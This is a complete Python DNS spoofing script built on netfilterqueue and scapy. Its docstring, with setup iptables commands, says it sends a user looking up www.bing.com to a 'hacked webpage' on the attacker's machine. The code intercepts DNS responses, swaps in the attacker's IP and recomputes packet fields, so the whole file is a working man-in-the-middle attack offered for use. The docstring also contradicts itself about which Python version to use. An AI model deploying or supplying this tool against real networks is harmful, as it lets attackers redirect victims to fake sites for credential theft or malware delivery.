#!/usr/bin/env python

"""
Start it with python 2 not python 3
netfilterqueue only works with Python3 < version 3.7

DNS spoofer replaces the IP addresses when accessing a defined web page (e.g. www.bing.com)
This way the user gets hacked webpage (web server on the hacker machine IP=192.168.1.165) instead of original www.bing.com

Before start, do port forwarding for incoming and outgoing traffic: 

iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0

when spoofing not needed any more clean the port forwarding:
iptables --flush
"""

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # check if packet contains DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # domain which is going to be spoofed
        if "www.bing.com" in qname:
            #print(scapy_packet.show())
            print(" Spoofing target ")
            # spoof the ip address of DNS server
            answer = scapy.DNSRR(rrname=qname, rdata = "192.168.1.165")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete fields
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


